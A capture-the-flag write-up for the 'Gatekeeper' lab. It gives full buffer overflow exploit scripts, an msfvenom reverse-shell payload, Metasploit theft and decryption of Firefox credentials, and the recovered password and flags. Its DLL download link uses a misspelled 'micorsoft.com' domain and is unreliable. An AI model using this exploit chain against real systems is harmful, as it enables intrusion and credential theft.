# Gatekeeper

> Can you get past the gate and through the fire?

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 -p- 10.10.92.209`
	- `nmap -T4 -A -p 135,139,445,3389,31337,49152,49153,49154,49155,49161 10.10.92.209 -Pn`
	- find interesting app running on port 31337
2. enumerate SMB:
	- find shares: `smbclient -L 10.10.92.209`
	- connect to share: `smbclient \\\\10.10.92.209\\Users -N`
	- get gatekeeper.exe file: `cd share` -> `get gatekeeper.exe`
3. find buffer overflow:
	- transfer gatekeeper.exe to Windows 10 (32-bit) machine and run with Immunity Debugger -- need "VCRUNTIME140.dll" to run so download this from [here](https://www.micorsoft.com/en-us/download/details.aspx?id=48145)
	- find EIP offset:
		- edit fuzzer.py:
		```python
		#!/usr/bin/env python3
		import socket, time, sys
		
		ip = "10.0.1.6"
		port = 31337
		timeout = 5
		prefix = ""
		string = "A" * 100

		while True:
		  try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			  s.settimeout(timeout)
			  s.connect((ip, port))
			  print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
			  s.send(bytes(string + "\r\n", "latin-1"))
			  s.recv(1024)
		  except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		  string += 100 * "A"
		  time.sleep(1)
		```
		- run gatekeeper.exe under Immunity Debugger and execute fuzzer.py -- crashed after 200 bytes
		- generate cyclic pattern: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`
		- edit exploit.py:
		```python
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 31337
		prefix = ""
		offset = 0
		overflow = "A" * offset
		retn = ""
		padding = ""
		payload = "<cyclic_pattern>"
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")
		```
		- in Immunity run: `!mona findmsp -distance 200`
		- EIP offset = 146
	- find bad chars:
		- in Immunity run: `!mona bytearray -cpb \x00`
		- copy and paste bytearray.txt C strings into exploit.py:
		```python
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 31337
		prefix = ""
		offset = 146
		overflow = "A" * offset
		retn = "BBBB"
		padding = ""
		payload = "<bytearray>"
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")
		```
		- restart gatekeeper.exe in Immunity and run exploit.py
		- in Immunity run: `!mona compare -f c:\mona\gatekeeper\bytearray.bin -a esp` -- found "\x00" and "\x0a" to be bad chars
		- in Immunity run: `!mona bytearray -cpb \x00\x0a`, remove "\x0a" from payload in exploit.py, restart gatekeeper.exe in Immunity, and execute exploity.py again
		- in Immunity run: `!mona compare -f c:\mona\gatekeeper\bytearray.bin -a esp` -- no more badchars
	- find jump address:
		- in Immunity run: `!mona jmp -r esp -cpb \x00\x0a`
		- found: "080414c3" or "080416bf"
	- create payload in msfvenom:
		- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.1.5 lport=1234 -f c -a x86 -b "\x00\x0a"`
	- copy C strings into exploit.py, edit return address, and add padding:
		```
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 31337
		prefix = ""
		offset = 146
		overflow = "A" * offset
		retn = "\xc3\x14\x04\x08"
		padding = "\x90" * 16
		payload = (<msfvenom_payload>)
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")
		```
	- restart gatekeeper.exe, setup listener in metasploit, and run exploit.py -- worked
4. exploit buffer overflow
	- change IP and payload in exploit.py and execute against real target -- success
	- user flag = **{H4lf_W4y_Th3r3}**
5. esclate privileges:
	- found Firefox.ini file
	- in meterpreter: `run post/windows/gather/enum_application` -- firefox installed
	- try to gather firefox credentials: `run /post/multi/gather/firefox_creds`
	- crack the credentials found:
		- download [firefox_decrypt.py](https://github.com/unode/firefox_decrypt)
		- setup the `~/.msf4/loot` directory as appropriate:
		```bash
		mv 20210723102451_default_10.10.29.53_ff.ljfn812a.cert_329354.bin cert9.db
		mv 20210723102452_default_10.10.29.53_ff.ljfn812a.cook_585541.bin cookies.sqlite
		mv 20210723102453_default_10.10.29.53_ff.ljfn812a.key4_817263.bin key4.db
		mv 20210723102453_default_10.10.29.53_ff.ljfn812a.logi_950792.bin logins.json
		```
		- run firefox decrypt: `python3 ~/firefox_decrypt/firefox_decrypt.py .`
	- credentials found = "mayor:8CL7O1N78MdrCIsV"
	- RDP into the machine and get the root flag:
		- `rdesktop 10.10.29.53 -u mayor` -> [password]
		- root flag = **{Th3_M4y0r_C0ngr4tul4t3s_U}**
